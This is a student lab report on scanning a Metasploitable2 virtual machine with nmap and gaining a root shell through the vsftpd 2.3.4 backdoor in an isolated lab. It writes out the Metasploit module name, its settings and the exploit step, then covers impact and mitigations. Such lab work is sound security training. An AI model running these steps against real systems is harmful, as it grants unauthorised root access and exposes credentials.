# Lab 01 – Reconnaissance and Initial Exploitation

## Objective
Identify exposed services on a vulnerable system, analyze potential vulnerabilities, and safely exploit one to demonstrate security risk.

## Environment
- Attacker Machine: Kali Linux (Virtual Machine) - 192.168.56.102
- Target: Metasploitable2 - 192.168.56.101
- Network: Host-only (isolated lab environment)

## Tools Used
- Nmap
- Metasploit

## Reconnaissance
A service and version scan was performed:
   nmap -sV 192.168.56.101
Results indicated 23 open ports, including:
- 21/tcp -FTP
- 22/tcp -SSH
- 23/tcp -Telnet
- 80/tcp -HTTP
- Multiple additional legacy services
The ftp version was identified as: vsftp 2.3.4

The presence of numerous outdated services significantly increases the attack surface.
  
## Vulnerability Identification
The FTP service was running: vsftpd version 2.3.4
This version is known to contain a malicious backdoor that enables unauthenticated remote command execution.

The vulnerability allows an attacker to trigger a hidden shell without valid credentials.

This is a *Critical* risk classification.

## Exploitation
Using *Metasploit Framework*, the following module was selected:
  exploit/unix/ftp/vsftpd_234_backdoor
  
Configuration: 
  set RHOSTS 192.168.56.101
  set RPORT 21
  exploit
  
Result: Command shell session 1 opened

Privilege verification: 
  whoami
output: *root*
This confirms full administrative compromise of the system.

## Impact Analysis
Successful exploitation resulted in;
- Unauthenticated remote root access
- Ability to read /etc/shadow (credential hashes)
- Full modification of system files
- Creation/deletion of user accounts
- Potential for lateral movement within internal networks

This directly compromises:
- Confidentiality: Access to sensitive data and credentials
- Integrity: Ability to modify system configurations
- Availability: Potential to disrupt or destroy services

## Mitigation & Defense
- Remove vsftp 2.3.4 immediately.
- Install verified and digitally signed software versions.
- Close unnecessary ports and services.
- Implement firewall rules and network segmentation.
- Regularly validate file integrity using cryptographic hashes.
- Conduct routine vulnerability scanning.

## Reflection
This lab demonstrated how outdated or compromised software can lead to an immediate full-system compromise.

Key takeaways:
- Version detection during reconnaissance is critical.
- Not all vulnerabilities are coding errors; some can be chain compromises.
- Gaining root access eliminates the need for privilege escalation.
- Proper patch management and integrity verification are essential defensive controls
